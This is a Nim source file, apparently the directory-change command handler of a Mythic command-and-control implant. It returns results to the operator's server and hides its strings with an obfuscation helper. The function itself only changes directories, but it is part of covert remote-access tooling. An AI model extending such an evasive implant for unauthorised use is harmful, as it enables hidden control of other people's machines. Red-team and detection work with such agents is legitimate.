import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, os, strformat, strutils]

type
  CdArgs = object
    path: string

proc changeDirectory*(taskId: string, params: string): JsonNode =
  # Parse arguments
  let args = parseJson(params).to(CdArgs)
  
  debug "[DEBUG] Changing directory to: ", args.path
  
  try:
    # Check for UNC paths - Windows doesn't support cd to UNC paths
    if args.path.startsWith("\\\\"):
      return mythicError(taskId, obf("Cannot cd to UNC paths. Use 'net use' to map a drive letter first, or use absolute UNC paths in file operations (ls, cat, etc.)"))
    
    # Handle the path
    let targetPath = if isAbsolute(args.path):
      args.path
    else:
      getCurrentDir() / args.path
    
    # Check if directory exists
    if not dirExists(targetPath):
      return mythicError(taskId, obf("Directory does not exist: ") & targetPath)
    
    # Change directory
    setCurrentDir(targetPath)
    
    # Get the new current directory
    let newCwd = getCurrentDir()
    
    debug "[DEBUG] Changed directory to: ", newCwd
    
    # Return response with cwd callback
    return mythicCallback(taskId, obf("Changed directory to") & " '" & newCwd & "'", %*{
      obf("cwd"): newCwd
    })
    
  except OSError as e:
    return mythicError(taskId, obf("Failed to change directory: ") & e.msg)
  except Exception as e:
    return mythicError(taskId, &"Error: {e.msg}")
